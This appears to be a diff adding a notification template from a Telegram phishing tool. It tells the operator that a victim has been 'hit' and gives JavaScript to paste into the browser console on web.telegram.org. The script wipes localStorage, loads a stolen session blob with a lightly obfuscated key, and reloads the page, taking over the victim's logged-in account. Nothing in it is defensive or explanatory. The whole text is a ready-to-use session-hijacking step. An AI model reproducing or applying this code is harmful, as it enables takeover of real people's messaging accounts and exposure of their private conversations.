@@ -1,0 +1,9 @@
+🟢 🎣 You have hit 👆 **THIS TELEGRAM USER** 👆 🎣
+
+\\ INSTRUCTIONS BELOW
+
+`😵 Please use the code below in your inspect element console on an incognito tab at: https://web.telegram.org/k/ AND DO NOT FORGET TO REPLACE ALL "" WITH "`
+
+\\ CODE BELOW
+
+`localStorage.clear();const data='{CODE}',newData=JSON.parse(data.replaceAll(atob("ImNobmdfdGltZSI="),(new Date).getTime().toString()));Object.keys(newData).forEach((a=>{"object"==typeof newData[a]?localStorage.setItem(a,JSON.stringify(newData[a])):localStorage.setItem(a,newData[a])})),location.reload();`
